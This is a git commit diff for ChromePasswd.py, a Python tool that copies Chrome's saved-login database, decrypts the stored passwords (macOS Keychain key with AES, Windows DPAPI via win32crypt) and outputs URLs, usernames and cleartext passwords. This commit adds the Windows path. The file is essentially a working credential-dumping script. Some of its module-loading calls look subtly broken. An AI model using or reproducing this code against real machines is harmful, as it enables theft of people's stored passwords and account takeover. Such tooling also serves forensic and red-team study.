6f7b3296ea49673cb290f9aa527563dabf528ff2
Priyank Chheda <priyank.chheda@Fireeye.com>
2018-04-24 10:06:53 +0530

    add windows support

--- ChromePasswd.py
+++ ChromePasswd.py
@@ -3,21 +3,32 @@ from getpass import getuser
 from shutil import copy
 import sqlite3
 from os import unlink
-from Crypto.Cipher import AES
-from Crypto.Protocol.KDF import PBKDF2
-import subprocess
-import string
 import json
+import importlib
+import string
 
 
 class ChromePasswd(object):
     def __init__(self):
-        target_os = platform.system()
-        if target_os == 'Darwin':
+        self.target_os = platform.system()
+        if self.target_os == 'Darwin':
             self.mac_init()
+        elif self.target_os == 'Windows':
+            self.win_init()
+
+
+    def import_libraries(self):
+        if self.target_os == 'Darwin':
+            globals()['AES'] = importlib.import_module('AES', 'Crypto.Cipher')
+            globals()['PBKDF2'] = importlib.import_module('PBKDF2', 'Crypto.Protocol.KDF')
+            globals()['subprocess'] = importlib.import_module('subprocess')
+
+        elif self.target_os == 'Windows':
+            globals()['win32crypt'] = importlib.import_module('win32crypt')
 
 
     def mac_init(self):
+        self.import_libraries()
         my_pass = subprocess.Popen(
             "security find-generic-password -wa 'Chrome'",
             stdout=subprocess.PIPE,
@@ -33,6 +44,7 @@ class ChromePasswd(object):
         self.key = PBKDF2(my_pass, salt, length, iterations)
         self.dbpath = ( "/Users/{}/Library/Application Support/Google"
                         "/Chrome/Default/".format(getuser()))
+        self.decrypt_func = self.mac_decrypt
 
 
     def mac_decrypt(self, enc_passwd):
@@ -41,6 +53,17 @@ class ChromePasswd(object):
         cipher = AES.new(self.key, AES.MODE_CBC, IV=iv)
         decrypted = cipher.decrypt(enc_passwd)
         return decrypted.strip().decode('utf8')
+
+
+    def win_init(self):
+        self.import_libraries()
+        self.dbpath = ( "C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\"
+                        "User Data\\Default\\".format(getuser()))
+        self.decrypt_func = self.win_decrypt
+
+
+    def win_decrypt(self, enc_passwd):
+        return win32crypt.CryptUnprotectData(enc_passwd, None, None, None, 0)[1]
 
 
     @property
@@ -56,12 +79,13 @@ class ChromePasswd(object):
                         FROM logins''')
         data = {'data':[]}
         for result in cursor.fetchall():
-            if result[1] or result[2]:
+            _passwd = self.decrypt_func(result[2])
+            passwd = ''.join(i for i in _passwd if i in string.printable)
+            if result[1] or passwd:
                 d = {}
                 d['url'] = result[0]
                 d['username'] = result[1]
-                passwd = self.mac_decrypt(result[2])
-                d['password'] = ''.join(i for i in passwd if i in string.printable)
+                d['password'] = passwd
                 data['data'].append(d)
         conn.close()
         unlink("Login Data.db")
